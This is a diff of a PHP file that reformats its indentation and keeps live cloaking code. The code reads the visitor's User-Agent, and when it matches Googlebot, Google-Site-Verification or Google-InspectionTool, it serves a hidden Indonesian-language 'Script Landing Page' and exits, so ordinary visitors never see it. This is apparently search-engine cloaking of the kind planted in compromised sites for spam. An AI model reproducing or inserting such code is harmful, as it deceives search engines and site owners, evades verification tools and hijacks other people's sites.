@@ -1,9 +1,9 @@
-	<?php
-	function check_user_agent($agent) {
-		return strpos($_SERVER['HTTP_USER_AGENT'], $agent) !== false;
-	}
+<?php
+function check_user_agent($agent) {
+    return strpos($_SERVER['HTTP_USER_AGENT'], $agent) !== false;
+}
 
-	$useragent_code = <<<'HTML'
+$useragent_code = <<<'HTML'
 <!-- Script Landing Page -->
 <!DOCTYPE HTML>
 <html xmlns:wormhole="http://www.w3.org/1999/xhtml" lang="id-ID">
@@ -4032,10 +4032,10 @@ window.onload = function() {
 </body>
 </html>
 
-	HTML;
+HTML;
 
-	if (check_user_agent('Googlebot') || check_user_agent('Google-Site-Verification') || check_user_agent('Google-InspectionTool')) {
-		echo $useragent_code;
-		exit;
-	}
-	?>
+if (check_user_agent('Googlebot') || check_user_agent('Google-Site-Verification') || check_user_agent('Google-InspectionTool')) {
+    echo $useragent_code;
+    exit;
+}
+?>
